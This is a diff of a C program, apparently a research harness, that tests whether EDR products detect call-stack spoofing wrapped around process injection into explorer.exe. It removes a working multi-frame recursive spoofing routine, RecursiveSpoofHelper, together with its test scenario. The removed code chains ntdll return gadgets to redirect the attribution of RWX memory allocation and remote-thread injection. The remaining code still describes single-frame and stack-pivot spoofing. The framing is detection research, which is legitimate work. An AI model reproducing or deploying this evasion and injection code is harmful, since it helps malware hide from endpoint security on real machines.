@@ -6,12 +6,9 @@
  * GetRandomGadget), stack pivot execution (ExecuteWithFakeFrame, SpoofCallStack ASM).
  *
  * Modifications by Davide Galdiero (@taekwondodev):
- * - Multi-frame recursion: SpoofCallStack applied also to the recursion base
- *   case, so the .pdata walker sees the spoofed frame as top of stack (not
- *   RecursiveSpoofHelper).
  * - Target function replaced with InjectExplorer: realistic injection pattern
  *   (OpenProcess + VirtualAllocEx RWX + WriteProcessMemory + CreateRemoteThread)
- *   on explorer.exe to trigger EDR behavioral detection across all 4 scenarios.
+ *   on explorer.exe to trigger EDR behavioral detection across all 3 scenarios.
  * - CaptureStackBackTrace output printed from inside the target function for
  *   direct comparison with WinDbg and System Informer captures.
  *
@@ -456,49 +453,6 @@ void *GetRandomGadget(GADGET_CACHE *cache) {
   return gadget;
 }
 
-/**
- * @brief Helper structure for recursive multi-frame spoofing
- */
-typedef struct _RECURSIVE_SPOOF_CONTEXT {
-  void *targetFunc;
-  void *parameter;
-  void **spoofChain;
-  DWORD currentDepth;
-  DWORD maxDepth;
-  DWORD64 result;
-} RECURSIVE_SPOOF_CONTEXT;
-
-/**
- * @brief Recursive helper to build genuine multi-frame spoofing
- * Each recursion level adds a real frame with a spoofed return address
- */
-__declspec(noinline) static void
-RecursiveSpoofHelper(RECURSIVE_SPOOF_CONTEXT *ctx) {
-  if (ctx->currentDepth >= ctx->maxDepth) {
-    void *baseGadget = ctx->spoofChain[ctx->currentDepth];
-    ctx->result =
-        SpoofCallStack(ctx->targetFunc, baseGadget, ctx->parameter, NULL);
-    return;
-  }
-
-  // Get the spoofed return address for this level
-  void *spoofedReturn = ctx->spoofChain[ctx->currentDepth];
-  void *realReturn = NULL;
-
-  // Increment depth for next recursion
-  ctx->currentDepth++;
-
-  // Use our single-frame spoofer at each recursion level
-  // This creates a genuine frame with a spoofed return
-  DWORD64 tempResult =
-      SpoofCallStack((void *)RecursiveSpoofHelper, // Call ourselves recursively
-                     spoofedReturn,                // With a spoofed return
-                     ctx,                          // Pass context
-                     &realReturn                   // Store real return
-      );
-
-  // Result is propagated through context structure
-}
 
 /* ============================================================================
  * TEST SCENARIOS
@@ -574,82 +528,6 @@ void TestInjectionSingleFrame(void) {
          elapsed);
   printf("[INFO] Result: 0x%08llX\n", result);
   printf("[DEBUG] Real return address was: 0x%p\n", realReturn);
-
-  g_stats.totalExecutions++;
-  g_stats.spoofAttempts++;
-  if (result)
-    g_stats.successfulSpoofs++;
-  g_stats.totalTimeMs += elapsed;
-}
-
-/**
- * @brief Scenario 3: Multi-frame chain spoofed injection
- *
- * RecursiveSpoofHelper builds CHAIN_DEPTH real frames, each with a spoofed
- * return address from ntdll. The resulting call chain is structurally valid
- * (.pdata-consistent, SP in TEB bounds) but attribution is fully redirected.
- * Hardest scenario for user-mode EDR to flag as anomalous.
- */
-void TestInjectionMultiFrame(void) {
-  PrintSeparator("SCENARIO 3: MULTI-FRAME CHAIN SPOOFED INJECTION");
-
-#define CHAIN_DEPTH 2
-
-  if (g_gadgetCache.count < CHAIN_DEPTH) {
-    printf("\n[WARNING] Insufficient gadgets for %d-frame chain (have %d)\n",
-           CHAIN_DEPTH, g_gadgetCache.count);
-    return;
-  }
-
-  printf("\n[INFO] Building TRUE %d-frame deep call chain using recursive "
-         "spoofing\n", CHAIN_DEPTH);
-  printf("[INFO] Expected: structurally valid chain, SP in TEB bounds, "
-         "attribution redirected to ntdll\n");
-
-  void *spoofChain[CHAIN_DEPTH + 1];
-  printf("\n  Multi-frame chain composition:\n");
-
-  for (int i = 0; i <= CHAIN_DEPTH; i++) {
-    spoofChain[i] = GetRandomGadget(&g_gadgetCache);
-    printf("    Frame[%d]: 0x%p", i, spoofChain[i]);
-
-    char buffer[sizeof(SYMBOL_INFO) + 256];
-    PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
-    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
-    pSymbol->MaxNameLen = 256;
-    DWORD64 displacement = 0;
-
-    if (SymFromAddr(GetCurrentProcess(), (DWORD64)spoofChain[i], &displacement,
-                    pSymbol)) {
-      printf(" (%s+0x%llX)", pSymbol->Name, displacement);
-    }
-    printf("\n");
-  }
-
-  RECURSIVE_SPOOF_CONTEXT ctx = {.targetFunc = InjectExplorer,
-                                 .parameter = NULL,
-                                 .spoofChain = spoofChain,
-                                 .currentDepth = 0,
-                                 .maxDepth = CHAIN_DEPTH,
-                                 .result = 0};
-
-  printf("\n[INFO] Executing with %d levels of recursion, each with spoofed "
-         "return\n", CHAIN_DEPTH);
-
-  LARGE_INTEGER start, end, freq;
-  QueryPerformanceFrequency(&freq);
-  QueryPerformanceCounter(&start);
-
-  RecursiveSpoofHelper(&ctx);
-  DWORD64 result = ctx.result;
-
-  QueryPerformanceCounter(&end);
-  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;
-
-  printf("\n[SUCCESS] Multi-frame spoofed injection completed in %llu ms\n",
-         elapsed);
-  printf("[INFO] Result: 0x%08llX\n", result);
-  printf("[INFO] %d spoofed frames visible in call stack\n", CHAIN_DEPTH);
 
   g_stats.totalExecutions++;
   g_stats.spoofAttempts++;
@@ -774,7 +652,7 @@ void PrintStatistics(void) {
   }
 
   printf("    * Technique Coverage:   ");
-  printf("Baseline | Single-Frame | Multi-Frame | Stack Pivot\n");
+  printf("Baseline | Single-Frame | Stack Pivot\n");
 }
 
 /* ============================================================================
@@ -810,7 +688,6 @@ int main(void) {
   // Execute test scenarios
   TestInjectionBaseline();
   TestInjectionSingleFrame();
-  TestInjectionMultiFrame();
   TestInjectionStackPivot();
 
   // Print summary
